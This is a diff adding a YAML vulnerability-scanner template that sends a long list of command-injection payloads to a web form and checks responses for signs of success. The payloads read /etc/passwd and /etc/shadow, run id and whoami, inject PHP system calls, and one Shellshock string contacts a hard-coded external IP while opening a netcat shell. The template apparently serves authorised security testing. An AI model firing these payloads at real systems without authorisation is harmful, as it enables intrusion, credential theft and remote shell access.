@@ -1,0 +1,96 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->"
+        - "%7Ccat%3B%2Fetc%2Fpasswd"
+        - "%22cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "a%29%3Bid"
+        - "%27id%27"
+        - "%0a whoami %0a"
+        - "a)|id|"
+        - ";cat /etc/passwd"
+        - "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->"
+        - "%7Ccat%3C%2Fetc%2Fpasswd"
+        - "%26%26cat%2520%2Fetc%2Fpasswd"
+        - "`id`"
+        - "||/usr/bin/id"
+        - "/*$(id)`id`"
+        - "%27id"
+        - "%29%3Bid"
+        - "||cat%20/etc/passwd"
+        - "%3Bcat%20%2Fetc%2Fpasswd"
+        - "cat%20/etc/passwd"
+        - "||echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd"
+        - "a%3Bid"
+        - "||cat%24u%20/etc$u/passwd"
+        - "%7Cid"
+        - "a);id"
+        - "`id`"
+        - "||id|"
+        - "cat%24u%2B%2Fetc%24u%2Fpasswd"
+        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;"
+        - "%7C%0Awhoami%0A%7C"
+        - "|cat%20/etc/passwd"
+        - ";cat+/etc/passwd"
+        - "||echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd"
+        - "%22id%0A"
+        - "&&id"
+        - "%3Bcat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "%3Bphpinfo"
+        - "&&cat%24u%20/etc$u/passwd"
+        - "||id"
+        - "||cat"
+        - "%26%26cat%20%2Fetc%2Fpasswd"
+        - "`id`"
+        - "%26id"
+        - "cat /etc/passwd"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?shell=\\`nc -lvvp 1236 -e /bin/bash\\`\""
+        - "<?php system(\"id\");?>"
+        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+ & NewLine"
+        - "%26cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "id"
+        - "|id"
+        - "<?php system(\"id\");?>"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
